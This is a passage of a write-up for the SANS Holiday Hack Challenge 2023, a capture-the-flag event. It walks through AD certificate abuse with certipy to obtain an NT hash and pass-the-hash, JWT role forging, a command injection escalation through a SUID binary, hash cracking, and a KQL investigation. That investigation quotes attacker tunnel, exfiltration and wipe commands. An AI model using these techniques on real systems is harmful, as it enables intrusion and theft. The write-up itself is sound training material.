wombleycube (1105)/PasswordLastSet: 2023-12-13 01:19:38.112684
wombleycube (1105)/PasswordDoesNotExpire: True
wombleycube (1105)/AccountIsDisabled: False
wombleycube (1105)/ScriptPath:
[*] Received 5 entries.
```

We can see the `wombleycube` user belongs to `NORTHPOLE\wombleycube` which is
not `researchers`, but they were mentioned in the hint. We cannot find any users
for the `researchers` group anyways so I guess we can concentrate on that.

Different way to get the users:

```
$ GetADUsers.py northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53 -all
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  PasswordLastSet             LastLogon
--------------------  -------------------         -------------------
alabaster             2023-12-13 01:10:31.560964  2023-12-13 03:44:12.652777
Guest                 <never>                     <never>
krbtgt                2023-12-13 01:17:09.824614  <never>
elfy                  2023-12-13 01:19:38.018905  2023-12-13 02:23:44.438829
wombleycube           2023-12-13 01:19:38.112684  2023-12-13 03:40:17.052271
```

Cannot dump hashes with secretsdump.py because our user doesn't have access.

```
$ secretsdump.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53 -dc-ip 10.0.0.53 -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[error removed]
```

One of the previous challenge hints talked about how AD can have the same
certificate issues. One tool that was mentioned in the Reportinator challenge
was `certipy` which is in included in this machine.

```
certipy find -u elfy@northpole.local -p 'J4`ufC49/J4766' -dc-ip 10.0.0.53

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA:
    CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231213035603_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231213035603_Certipy.txt'
[*] Saved JSON output to '20231213035603_Certipy.json'
```

Certificate authority info

```
CA Name : northpole-npdc01-CA
DNS Name : npdc01.northpole.local
```

12 certificate templates are active. These three look promising:

`Administrator`, `User`, `NorthPoleUsers`.

Can we get an admin user or should we just get one for `wombleycube` because
none of the users are admin.

Next we must request a certificate for the `wombleycube` user like this:

```
$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 773
[*] Got certificate with UPN 'JOHN@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-1103'
[*] Saved certificate and private key to 'john.pfx'
```

I got an error because I awas passing `npdc01.northpole.local` to target, I
should have used the actual IP.

We cannot enroll as admin

```
$ certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766'
    -ca northpole-npdc01-CA -target 10.0.0.53 -template Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: NORTHPOLE.LOCAL
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 -
    CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template
    do not allow the current user to enroll for this type of certificate.
[*] Request ID is 32
Would you like to save the private key? (y/N) y
[*] Saved private key to 32.key
[-] Failed to request certificate
```

And we cannot do this either https://github.com/ly4k/Certipy#esc7.

Let's start with ESC1: https://github.com/ly4k/Certipy#esc1

```
certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' \
    -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers \
    -upn wombleycube@northpole.local -dns npdc01.northpole.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: NORTHPOLE.LOCAL
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 36
[*] Got certificate with multiple identifications
    UPN: 'wombleycube@northpole.local'
    DNS Host Name: 'npdc01.northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'
```

Then we can continue with the guide to get the hash for `wombleycube`.

```
$ certipy auth -pfx w.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'wombleycube@northpole.local'
    [1] DNS Host Name: 'npdc01.northpole.local'
> 0
[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

Option 1 returns this:
`aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23`

This didn't work with `smbclient` so I went in and used the second option this
time:
`aad3b435b51404eeaad3b435b51404ee:cf41d14e7eb9cd009b5d174b14d77d1b`

**I was connecting to the file share with the wrong username when using the hashes.**
I should connect using the wombleycube username when using its hash.

```
$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 \
    -dc-ip 10.0.0.53 northpole.local/wombleycube@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# info
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 ..
-rw-rw-rw-        231  Wed Dec 13 01:20:33 2023 InstructionsForEnteringSatelliteGroundStation.txt

# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

Answer: `InstructionsForEnteringSatelliteGroundStation.txt`.

# Faster Lock Combination
> Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock.
> Do some research and see if you can help open it!

Hs is in Brass Bouy Port.

> I'm sure there are some clever tricks and tips floating around [the web][comb]
> that can help us crack this code without too much of a flush... I mean fuss.
>
> Remember, we're aiming for quick and easy solutions here - nothing too
> complex.
>
> Once we've gathered a few possible combinations, let's team up and try them
> out.

[comb]: https://www.youtube.com/watch?v=27rE5ZvWLU0

Google doc from the video author: https://docs.google.com/document/d/1QhKZLDr22G0RpuTSGm0M6pz4dG82IByesim3elwfw98/edit

Removed my notes here because I found https://samy.pl/master/master.html.

I tried a few times and nothing worked. I even dumped the numbers with
`console.log(lock_numbers)` and trying them didn't work either.

So I cheated. Put a breakpoint on `if (stage == 3 && !isTweenActive) {`. Change
`stage` to `3` and I was done.

# The Captain's Comms
> Speak with Chimney Scissorsticks on Steampunk Island about the interesting
> things the captain is hearing on his new Software Defined Radio. You'll need
> to assume the `GeeseIslandsSuperChiefCommunicationsOfficer` role.

Hs is in Brass Bouy Port.

I have kept only the important parts of the dialoge.

> The new SDR uses some fancy JWT technology to control access.
>
> The captain has a knack for shortening words, some sorta abbreviation trick.
>
> Not familiar with JWT values? No worries; just think of it as a clue-solving game.
>
> I've seen that the Captain likes to carry his journal with him wherever he goes.
>
> If only I could find the planned "go-date", "go-time", and radio frequency they plan to use.
>
> Remember, the captain's abbreviations are your guiding light through this mystery!
>
> Once we find a JWT value, these villains won't stand a chance.
>
> We need to recreate an administrative JWT value to successfully transmit a message.

Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!

Send a message with a new `go-time` that is four hours earlier than what was
planned.

Four roles:

* `radioUser`: Initial jwt. Cannot do anything.
* `radioMonitor`: `jwDefault/rMonitor.tok` to view data.
* `radioDecoder`: To decode signals.
* Admin which is `GeeseIslandsSuperChiefCommunicationsOfficer`.

The system uses JWT authorization bearer tokens.

The main page sets two cookies:

```json
// justWatchThisRole

// header
{
  "alg": "RS256",
  "typ": "JWT"
}

// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioUser"
}

// signature
```

And `CaptainsCookie` which appears to be malformed

```json
// header
{"captainsVictory":0,"userid":"1107f7a8-1eef-4a38-b8f8-7335c94bc9c6"}

// payload
e}$1

// signature
00000000  8f 95 89 dd aa 16 86 67 c6 b5 ab 7b 9a 5f 20 b2  |...Ýª..gÆµ«{._ ²|
00000010  ed 80 80 0a                                      |í...|
```

Our first task is figure out how to change the role to `radioMonitor`.

https://captainscomms.com/checkRole uses the `justWatchThisRole` cookie as an
"Authorization: Bearer" token.

`X-Request-Item` header has the requested resource:

* `waterfall`: decoder.
* `tx`: transmitter.

`https://captainscomms.com/jwtDefault` is also inaccesible even with the initial
JWT.

With the default token, we get this

```json
// header
{"alg":"RS256","typ":"JWT"}

// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioMonitor"
}
```

So I guess we can use this token to access the laptop monitor. The checkrole is
called when I click on the signals so I edited the value of the
`justWatchThisRole` in the browser.

We can click on the signals to decode them. None are accessible with our current
token.

The value of `X-Request-Item` for them are (from left to right).

* `dcdCW`: Has morse code and we saw it in the journal.
* `dcdNUM`:
* `dcdFX`:

We need to have the `radioDecoder` role to access them.

The notes mention that captain's public key is in the same directory as the
`radioMonitor` token. Using the authorization header we see it at
https://captainscomms.com/jwtDefault/keys/capsPubKey.key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Let's try doing an `"alg":"none"` attack and change our role to `radioDecoder`.
Most likely will not work. And it didn't work.

If we see the public key, the challenge might want us to do a "sign with
public key" attack to modify the role to `radioDecoder`.

Signing with empty key like this didn't work.

```json
{
    "kid": "../../../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256"
}
```

Signing the key with the public key didn't work either.

The trick was trying to download https://captainscomms.com/jwtDefault/rDecoder.tok
with the `radioMonitor` token. Which gave me the `radioDecoder` token.

```json
// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioDecoder"
}
```

Now when clicking on the signals to decode, I get these in response:
`dcdCW.mp4`, `dcdNUM.mp4`, `dcdFX.mp4`.

Burp was hiding the image files in the history (because that's how I usually set
up the filters). The actual files are in paths like this
`https://captainscomms.com/static/images/dcdCW.mp4`. It was not working in the
Burp browser so I had to use cURL. Interestingly, the other two files didn't
need the JWT and I could just download them.

All 3 are video files:

```
// dcdCW.mp4
SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R.

// dcdFX.mp4
Image of the islands. The center one has a bubble that says "Freq: 10426 Hz".

// dcdNUM.mp4
{music} {music} {music}
88323 88323 88323
{gong} {gong} {gong} {gong} {gong} {gong}
12249 12249 16009 16009 12249 12249 16009 16009
{gong} {gong} {gong} {gong} {gong} {gong}
{music} {music} {music}
```

We need to figure out the name of the private key.

Clues: `TH3CAPSPR1V4T3F0LD3R` and `/jwtDefault/keys/capsPubKey.key`.

Key is in `https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key`

We can forge a JWT for the admin role. The admin role is
`GeeseIslandsSuperChiefCommunicationsOfficer`. And we can use the transmitter.

We need a `frequency`, `go-date` and `go-time`.

We already know the frequency: `10426`.

We have to decode the number station message to figure out the `go-date` and
`go-time` of the original message and then respond with a time four hours
earlier.

Usually the first part of the message in the number station (`88323` here) is
the ID of the intended recipient. We can discard it here.

Looking at the rest of the numbers. They all end in 9

```
12249 12249 16009 16009 12249 12249 16009 16009

// if we remove it, we get 1224 1600 which are the date and time.

// we need to send 4 hours earlier so
1224 1200
```

**And that solved the challenge.**

# Linux PrivEsc
> Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand
> with escalation for a tip about hidden islands.

Hint:

> There's [various ways][linux-lpe] to escalate privileges on a Linux system.

[linux-lpe]: https://payatu.com/blog/a-guide-to-linux-privilege-escalation/

Another hint:

> Use the privileged binary to overwriting a file to escalate privileges could
> be a solution, but there's an easier method if you pass it a crafty argument.

```
* Find a method to escalate privileges inside this terminal and then run the binary in /root *

$ whoami
elf

$ uname -a 
Linux 69784a4cfc71 5.10.0-26-cloud-amd64 #1
    SMP Debian 5.10.197-1 (2023-09-29) x86_64 x86_64 x86_64 GNU/Linux
```

SUID executables appear to be what we should be looking for.

```
$ find / -perm -u=s -type f 2>/dev/null 
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

The last binary is the one we should be exploiting because it's very new.

```
$ ls -alt /usr/bin
total 35800
-rwsr-xr-x 1 root root     16952 Dec  2 22:17  simplecopy
# removed

$ /usr/bin/simplecopy --help
Usage: ./simplecopy <source> <destination>
```

We can easily copy out `/etc/passwd` and change our permissions to be able to
run as root. However, what about the "crafty argument"?

Both arguments are vulnerable to command injection. However, first argument's
injection will use the rest as input. So `/usr/bin/simplecopy nem1;ls nem2` will
run `ls nem2`.

Seems like I cannot do spaces in the commands unless I split it between the
arguments. E.g., this doesn't work because `ls -alt` is counted as one command.

```
`/usr/bin/simplecopy nem2;'ls -alt' /root
Usage: /usr/bin/simplecopy <source> <destination>
bash: ls -alt: command not found`
```

This should work but doesn't?!

```
$ /usr/bin/simplecopy nem2;ls /root  
Usage: /usr/bin/simplecopy <source> <destination>
ls: cannot open directory '/root': Permission denied
```

For some reason I cannot see inside `/root`. Although the permissions are set.

```bash
$ /usr/bin/simplecopy nem2;'ls' -alt 
Usage: /usr/bin/simplecopy <source> <destination>
# removed
drwx------   1 root root 4096 Dec  2 22:17 root
```

I am still `elf`?

```
$ /usr/bin/simplecopy nem2;'whoami' 
Usage: /usr/bin/simplecopy <source> <destination>
elf
```

Looks like it's just piping the input to `cp` so `cp src dst`. So this copies
`/root` to `/home/elf`: `/usr/bin/simplecopy '-r /root' '/home/elf/'` but the
permissions are not changed.

After relogging to the machine, it worked. With `whoami` I can see I am root. So
now I can see inside the `/root` directory.

```
$ /usr/bin/simplecopy '--ss' ';ls /root'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
runmetoanswer

$ /usr/bin/simplecopy '--ss' ';/root/runmetoanswer'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
Who delivers Christmas presents?

> [waits for prompt]
```

Now I need to answer the question. `Santa` is not the correct answer.
Answer was actually `santa`. We could also see the help for this binary with

```
$ /usr/bin/simplecopy '--ss' ';/root/runmetoanswer --help'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
D'aww, people hardly ever ask me for help! Nice to meet you!

The usage is really easy, we promise! Just pass your answer as a commandline argument, like:

    ./runtoanswer MyWonderfulAnswer

Or just run ./runtoanswer by itself, and it'll ask for your answer!

Bye now!
```

Hint from Rose Mold after finishing:

> There's a hidden, uncharted area somewhere along the coast of this island, and
> there may be more around the other islands.
>
> The area is supposed to have something on it that's totes worth, but I hear
> all the bad vibe toys chill there.
>

In the hints:

> Uncharted
>
> Not all the areas around Geese Islands have been mapped, and may contain
> wonderous treasures. Go exploring, hunt for treasure, and find the pirate's
> booty!

Treasure? Does it mean all the ports? I've already found all of them. Hmm.

# Hashcat
Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys
and take a crack at it!

> Determine the hash type in hash.txt and perform a wordlist cracking attempt to
> find which password is correct and submit it to /bin/runtoanswer

```
$ cat hash.txt 
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:[removed]$[removed]
```

It appears to be a Kerberos ticket `$krb5asrep$23$<user>@<realm>:<long_string>`:

* `$krb5asrep$`: It's a Kerberos AS-REP (Authentication Service Response) ticket.
* `23`: The version number of the Kerberos protocol. `asdsad`
* `<user>`: The username associated with the ticket, `alabaster_snowball`.
* `<realm>`: The Kerberos realm, `XMAS.LOCAL`.
* `<long_string>`: The actual encrypted ticket data.


Break with hashcat

```
$ hashcat -m 18200 -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 \
    --force hash.txt password_list.txt
# removed

Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!
```

Now we need to see the password.

```
$ hashcat -m 18200 --show hash.txt   
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:[22865a2bceeaa73227ea4021879eda02]$[string]:IluvC4ndyC4nes!

$ /bin/runtoanswer IluvC4ndyC4nes!
Your answer: IluvC4ndyC4nes!

Checking....
Your answer is correct!
```

Answer: `IluvC4ndyC4nes!`.

# Luggage Lock
> Help Garland Candlesticks on the Island of Misfit Toys get back into his
> luggage by finding the correct position for all four dials.

Hint:
> Check out Chris Elgee's [talk][lug] regarding his and his wife's luggage.
> Sounds weird but interesting!

[lug]: https://www.youtube.com/watch?v=ycM1hBSEyog

1. Align the notches.
2. Try.
3. If it doesn't work, move each item one right and try again.

Put pressure on the opening lock and spin the numbers until they get stuck.

# Na'an
> Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling
> elf and win!

Hint:

> Try to outsmart Shifty by sending him an error he may not understand.

https://www.tenable.com/blog/python-nan-injection

We have to modify the payload to send `nan` instead of the numbers.

```json
POST /action?id=971d000d-84e3-48fd-b78f-971da824e6a1 HTTP/2
Host: nannannannannannan.com

{"play":"5,4,3,2,1"}
```

Either use Burp or put a breakpoint on the line below and modify the values of
`array_of_choices_as_csv`.

```js
function play_card_selection(array_of_choices_as_csv) {
    armsopen()
    if (!Array.isArray(array_of_choices_as_csv)) {
        Talk("That was not a valid array of string choices!")
        return
    }
    var isstringarr = array_of_choices_as_csv => array_of_choices_as_csv.every(i => typeof i === "string")
    if (!isstringarr) {
        Talk("That was not a valid array of string choices!")
        return
    }
    var rid = getIdFromUrlOrDefault() // <--- HERE

```

# Phish Detection Agency
> Not suggesting a full-blown forensic analysis, just mark the ones screaming
> digital fraud.

Hint:

> Discover the essentials of email security with DMARC, DKIM, and SPF at
> [Cloudflare's Guide][cld].

[cld]: https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/

1. `DMARC: Fail` -> phishing.
2. `DMARC: Pass` but not from `mail.geeseislands.com` -> phishing.

# KQL Kraken Hunt
> Use Azure Data Explorer to [uncover misdeeds][kusto] in Santa's IT enterprise.
> Go to Film Noir Island and talk to Tangle Coalbox for more information.

[kusto]: https://detective.kusto.io/sans2023

From Tangle Coalbox

> Before you start, you'll need to create a [free cluster][clus].

[clus]: https://dataexplorer.azure.com/freecluster

Hints:

> Do you need to find something that happened via a process? Pay attention to
> the ProcessEvents table!
>
> Once you get into the [Kusto trainer][kusto], click the blue Train me for the
> case button to get familiar with KQL.
>
> Looking for a file that was created on a victim system? Don't forget the
> FileCreationEvents table.

Notes:

`has` operator == `contains`
`==` operator or case-insensitive `=~` operator


Which employee has the IP address: '10.10.0.19'?

```sql
Employees 
| where ip_addr == "10.10.0.19"

Candy Cane Sugarplum
```

How many emails did Santa Claus receive?

```sql
Email
| where recipient =~ "santa_claus@santaworkshopgeeseislands.org"
| summarize count() by recipient

// the solution uses "count" like this

Email
| where recipient =~ 'santa_claus@santaworkshopgeeseislands.org'
| count

19
```

`summarize dcount(sender)` or `distinct sender`.

`OutboundNetworkEvents` table contains websites browsed by employees.
User name is not recorded, but each user has one assigned IP address in the
`Employees` table.

The 3rd question in the training is wrong. It asks "How many unique websites did
Rudolph Rednose visit?". There's no employee by that name in the `Employees`
table.

The solution uses the IP for "Rudolph Wreathington" (only employee with Rudolph
in their name) and the answer from that solution is not accepted.

KQL Cheatsheet: https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference

## Onboarding
**How many Craftperson Elf's are working from laptops?**

The `Employees` table has a column `hostname`. Laptop users' machines end in
`LAPTOP` like `RZLS-LAPTOP`.

My initial mistake was not looking at the roles. Not every employee has the
`Craftperson Elf` role.

```sql
Employees
| where role has "craftsperson" and hostname has "laptop"
| summarize dcount(hostname)

25
```

## Case 1
The alert says the user clicked the malicious link
`http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx`.

```sql
Email
| where link == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

**What is the email address of the employee who received this phishing email?**
`alabaster_snowball@santaworkshopgeeseislands.org`

**What is the email address that was used to send this spear phishing email?**  
`cwombley@gmail.com`

**What was the subject line used in the spear phishing email?**
`[EXTERNAL] Invoice foir reindeer food past due`

## Case 2

```sql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
```

**What is the role of our victim in the organization?**
`Head Elf`

**What is the hostname of the victim's machine?**
`Y1US-DESKTOP`

**What is the source IP linked to the victim?**
`10.10.0.4`

## Case 3

```sql
OutboundNetworkEvents
| where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

**What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!**
`2023-12-02T10:12:42Z`

**What file is dropped to Alabaster's machine shortly after he downloads the malicious file?**
Assuming "shortly" here is an hour. We can use `between`. Note how I had to pass
the time stamp text to `datetime`.

```sql
FileCreationEvents
| where hostname == "Y1US-DESKTOP" and timestamp between(datetime(2023-12-02T10:12:42Z) .. datetime(2023-12-02T11:12:42Z))
```

We see two results, the first is the docx, and the second is the answer:
`C:\ProgramData\Windows\Jolly\giftwrap.exe`.

## Case 4
Analyzing what `giftwrap.exe` did.

**The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?**
I couldn't find any data with `process_name` or `parent_process_name` set
to `giftwrap`. So I just listed all the events for that machine and then looked
at the events near the timestamp after download file event in the previous
answer.

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP"

# found this command
"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
```

`113.37.9.17`

**What is the timestamp when the attackers enumerated network shares on the machine?**
The command is `net share`.

```sql
ProcessEvents
| where process_commandline has "net share"
```

`2023-12-02T16:51:44Z`

**What was the hostname of the system the attacker moved laterally to?**

> In other words, they move payloads from one endpoint to another and execute
> them. Adversaries do this with native utilities like net.exe

Source: https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/

So we need to look for `net use`

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and process_commandline has "net use"

// result
cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
```

`NorthPolefileshare`

## Case 5
Commands might be base64 encoded.

`extend` adds a column to the result table.

```sql
Employees 
| where name == "Santa Claus" 
| extend Base64Name=base64_encode_tostring(name)
```

`base64_decode_tostring` does decoding.

**When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?**
Let's see which commands on the machine had the string `powershell`.

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and process_commandline has "powershell"
```

First result is actually wrong.

We're looking for the 2nd which happend in `2023-12-24T16:07:47Z`

**What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)**
`NaughtyNiceList.txt`

The 2nd command with a base64 payload decodes into this:

```powershell
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\
    metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''

// after reverse
powershell.exe -c Copy-Item
    \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt
    C:\Desktop\NaughtyNiceList.txt
```

**The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?**
`giftbox.com`

Another payload after base64 decode decodes into:

```powershell
[StRiNg]::JoIn( '', [ChaR[]]([removed]))|& ((gv '*MDr*').NamE[3,11,2]-joiN

# According to ChatGPT
Download-File C:\Desktop\NaughtyNiceList.docx \\giftbox.com\file

# It's actually wrong, the correct answer is
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```

## Case 6
We know that the attackers stole Santa's naughty or nice list. What else
happened? Can you find the final malicious command the attacker ran?

The final base64 encoded command is
`C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$`

**What is the name of the executable the attackers used in the final malicious command?**
`downwithsanta.exe`

**What was the command line flag used alongside this executable?**
`--wipeall`

## Final
To earn credit for your fantastic work, return to the Holiday Hack Challenge and
enter the secret phrase which is the result of running this query:
`print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')`

Answer: `Beware the Cube that Wombles`.

# Space Island Door Access Speaker
> There's a door that needs opening on Space Island! Talk to Jewel Loggins there
> for more information.

The secret passphrase is from `Certificate SSHenanigans`.

```
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

We need to upload a wav file that says the passphrase (all of that text and not
just the quote) in Wombley's voice. We have his sound in the audiobook he gave
us so we need to find an AI that can do analyze it and make a file for us.

https://play.ht/ is in the first hint for this year's holiday hack.

# Game Cartridges: Vol 1
Find the first Gamegosling cartridge and beat the game

The first one is in Tarnished Cove

It's a block move game.
